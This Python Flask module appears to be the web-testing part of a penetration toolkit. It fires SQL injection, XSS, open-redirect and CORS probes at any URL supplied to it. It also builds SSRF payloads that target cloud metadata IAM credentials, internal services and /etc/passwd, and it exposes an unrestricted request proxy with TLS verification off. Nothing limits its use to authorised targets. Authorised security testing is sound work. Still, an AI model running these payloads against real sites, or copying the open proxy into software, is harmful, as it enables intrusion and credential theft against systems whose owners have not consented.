from flask import Blueprint, request
from core.utils import success, error
import requests
import socket
import re
import urllib.parse

web_bp = Blueprint('web', __name__)


# -- HTTP REQUEST TESTER -------------------------------------------------------
@web_bp.route('/request', methods=['POST'])
def http_request():
    """Make HTTP request and return full response details."""
    data    = request.json or {}
    url     = data.get('url', '').strip()
    method  = data.get('method', 'GET').upper()
    headers = data.get('headers', {})
    body    = data.get('body', '')
    follow  = data.get('follow_redirects', True)
    timeout = int(data.get('timeout', 10))

    if not url:
        return error('Provide a URL')
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url

    try:
        resp = requests.request(
            method, url,
            headers=headers,
            data=body if body else None,
            allow_redirects=follow,
            timeout=timeout,
            verify=False,
        )

        return success({
            'status_code':  resp.status_code,
            'reason':       resp.reason,
            'url':          resp.url,
            'headers':      dict(resp.headers),
            'body':         resp.text[:5000],
            'body_length':  len(resp.content),
            'elapsed_ms':   int(resp.elapsed.total_seconds() * 1000),
            'redirects':    [r.url for r in resp.history],
        })
    except requests.exceptions.SSLError:
        return error('SSL verification failed. Try with verify=false.')
    except requests.exceptions.ConnectionError:
        return error(f'Could not connect to {url}')
    except requests.exceptions.Timeout:
        return error(f'Request timed out after {timeout}s')
    except Exception as ex:
        return error(f'Request failed: {str(ex)}')


# -- SQLI TESTER ---------------------------------------------------------------
@web_bp.route('/sqli_test', methods=['POST'])
def sqli_test():
    """Test URL parameter for basic SQL injection indicators."""
    data   = request.json or {}
    url    = data.get('url', '').strip()
    param  = data.get('param', 'id')
    value  = data.get('value', '1')

    if not url:
        return error('Provide a URL')

    payloads = [
        ("Error-based single quote",   f"{value}'"),
        ("Error-based double quote",   f'{value}"'),
        ("Always true",                f"{value} OR 1=1 --"),
        ("Always false",               f"{value} AND 1=0 --"),
        ("SLEEP time-based",           f"{value}; WAITFOR DELAY '0:0:3' --"),
        ("Comment injection",          f"{value}'--"),
        ("Union null",                 f"{value}' UNION SELECT NULL --"),
    ]

    sql_errors = [
        'sql syntax', 'mysql_fetch', 'syntax error',
        'ora-01756', 'microsoft ole db', 'odbc drivers',
        'sqlite_error', 'pg_query', 'you have an error',
        'unclosed quotation', 'quoted string not properly terminated',
        'division by zero', 'supplied argument is not',
        'invalid use of group function',
    ]

    results = []
    baseline_len = 0

    try:
        r = requests.get(url, params={param: value}, timeout=6, verify=False)
        baseline_len = len(r.content)
        baseline_text = r.text.lower()
    except Exception as ex:
        return error(f'Could not reach baseline URL: {str(ex)}')

    for name, payload in payloads:
        try:
            r       = requests.get(url, params={param: payload}, timeout=8, verify=False)
            diff    = abs(len(r.content) - baseline_len)
            text    = r.text.lower()
            errors  = [e for e in sql_errors if e in text]
            vulnerable = len(errors) > 0 or diff > 500

            results.append({
                'payload':      payload,
                'test':         name,
                'status':       r.status_code,
                'response_len': len(r.content),
                'diff_from_baseline': diff,
                'sql_errors':   errors,
                'potentially_vulnerable': vulnerable,
            })
        except Exception as ex:
            results.append({
                'payload': payload,
                'test':    name,
                'error':   str(ex),
            })

    vulnerable_count = sum(1 for r in results if r.get('potentially_vulnerable'))

    return success({
        'url':            url,
        'param':          param,
        'baseline_len':   baseline_len,
        'tests_run':      len(results),
        'potentially_vulnerable': vulnerable_count > 0,
        'vulnerable_count': vulnerable_count,
        'results':        results,
    })


# -- XSS TESTER ----------------------------------------------------------------
@web_bp.route('/xss_test', methods=['POST'])
def xss_test():
    """Test URL parameter for reflected XSS."""
    data  = request.json or {}
    url   = data.get('url', '').strip()
    param = data.get('param', 'q')

    if not url:
        return error('Provide a URL')

    payloads = [
        '<script>alert(1)</script>',
        '"><script>alert(1)</script>',
        "';alert(1)//",
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        'javascript:alert(1)',
        '"><img src=x onerror=alert(1)>',
    ]

    results = []
    for payload in payloads:
        try:
            r        = requests.get(url, params={param: payload}, timeout=6, verify=False)
            reflected = payload in r.text
            encoded  = urllib.parse.quote(payload) in r.text

            results.append({
                'payload':   payload,
                'reflected': reflected,
                'encoded':   encoded,
                'status':    r.status_code,
                'vulnerable': reflected and not encoded,
            })
        except Exception as ex:
            results.append({ 'payload': payload, 'error': str(ex) })

    vulnerable = any(r.get('vulnerable') for r in results)
    return success({
        'url':        url,
        'param':      param,
        'vulnerable': vulnerable,
        'results':    results,
    })


# -- SSRF TESTER ---------------------------------------------------------------
@web_bp.route('/ssrf_payloads', methods=['POST'])
def ssrf_payloads():
    """Generate SSRF test payloads for a target URL."""
    data      = request.json or {}
    target = data.get('target', '').strip() or 'https://example.com/fetch?url='
    callback = data.get('callback', '').strip() or 'http://your-server.com/ssrf'

    payloads = [
        { 'desc': 'Localhost',              'url': 'http://127.0.0.1' },
        { 'desc': 'Localhost alt',          'url': 'http://localhost' },
        { 'desc': 'IPv6 localhost',         'url': 'http://[::1]' },
        { 'desc': 'AWS metadata',           'url': 'http://169.254.169.254/latest/meta-data/' },
        { 'desc': 'AWS user data',          'url': 'http://169.254.169.254/latest/user-data/' },
        { 'desc': 'AWS IAM credentials',    'url': 'http://169.254.169.254/latest/meta-data/iam/security-credentials/' },
        { 'desc': 'GCP metadata',           'url': 'http://metadata.google.internal/computeMetadata/v1/' },
        { 'desc': 'Azure metadata',         'url': 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' },
        { 'desc': 'Internal port 22',       'url': 'http://127.0.0.1:22' },
        { 'desc': 'Internal port 3306',     'url': 'http://127.0.0.1:3306' },
        { 'desc': 'Internal port 6379',     'url': 'http://127.0.0.1:6379' },
        { 'desc': 'Internal port 9200',     'url': 'http://127.0.0.1:9200' },
        { 'desc': 'File read /etc/passwd',  'url': 'file:///etc/passwd' },
        { 'desc': 'Dict protocol',          'url': 'dict://127.0.0.1:11211/stat' },
        { 'desc': 'Gopher Redis',           'url': 'gopher://127.0.0.1:6379/_PING' },
        { 'desc': 'Callback server',        'url': callback },
        { 'desc': '0.0.0.0',               'url': 'http://0.0.0.0' },
        { 'desc': 'Decimal IP',            'url': 'http://2130706433' },  # 127.0.0.1 decimal
        { 'desc': 'Hex IP',               'url': 'http://0x7f000001' },   # 127.0.0.1 hex
        { 'desc': 'Octal IP',             'url': 'http://0177.0.0.1' },   # 127.0.0.1 octal
    ]

    full_urls = [{ **p, 'full_url': f"{target}{urllib.parse.quote(p['url'])}" } for p in payloads]

    return success({
        'target':   target,
        'payloads': full_urls,
    })


# -- OPEN REDIRECT TESTER ------------------------------------------------------
@web_bp.route('/open_redirect', methods=['POST'])
def open_redirect():
    """Test for open redirect vulnerability."""
    data    = request.json or {}
    url     = data.get('url', '').strip()
    param   = data.get('param', 'redirect')
    target  = data.get('target', 'https://evil.com')

    if not url:
        return error('Provide a URL')

    payloads = [
        target,
        f'//{target.replace("https://", "").replace("http://", "")}',
        f'///{target.replace("https://", "").replace("http://", "")}',
        f'https:{target.replace("https://", "")}',
        f'javascript:window.location="{target}"',
        f'//evil.com@{target.replace("https://","").replace("http://","")}',
    ]

    results = []
    for payload in payloads:
        try:
            r = requests.get(url, params={param: payload},
                           allow_redirects=False, timeout=6, verify=False)
            location = r.headers.get('Location', '')
            redirects_to_evil = (
                target in location or
                'evil.com' in location or
                location.startswith('//')
            )
            results.append({
                'payload':   payload,
                'status':    r.status_code,
                'location':  location,
                'vulnerable': redirects_to_evil and r.status_code in [301,302,303,307,308],
            })
        except Exception as ex:
            results.append({ 'payload': payload, 'error': str(ex) })

    vulnerable = any(r.get('vulnerable') for r in results)
    return success({
        'url':        url,
        'vulnerable': vulnerable,
        'results':    results,
    })


# -- CORS TESTER ---------------------------------------------------------------
@web_bp.route('/cors_test', methods=['POST'])
def cors_test():
    """Test CORS configuration of a URL."""
    data   = request.json or {}
    url    = data.get('url', '').strip()
    if not url:
        return error('Provide a URL')
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url

    test_origins = [
        'https://evil.com',
        'null',
        f'https://{url.split("/")[2]}.evil.com',
        'https://evil.com.' + url.split('/')[2],
        url.replace('https://', 'http://'),
    ]

    results = []
    for origin in test_origins:
        try:
            r = requests.options(url,
                headers={ 'Origin': origin, 'Access-Control-Request-Method': 'GET' },
                timeout=6, verify=False)
            acao = r.headers.get('Access-Control-Allow-Origin', '')
            acac = r.headers.get('Access-Control-Allow-Credentials', '')
            vulnerable = (
                acao == origin or
                acao == '*' or
                (acao and 'evil' in acao)
            )
            results.append({
                'origin':      origin,
                'acao':        acao,
                'credentials': acac,
                'vulnerable':  vulnerable,
                'status':      r.status_code,
            })
        except Exception as ex:
            results.append({ 'origin': origin, 'error': str(ex) })

    vulnerable = any(r.get('vulnerable') for r in results)
    return success({
        'url':        url,
        'vulnerable': vulnerable,
        'results':    results,
    })
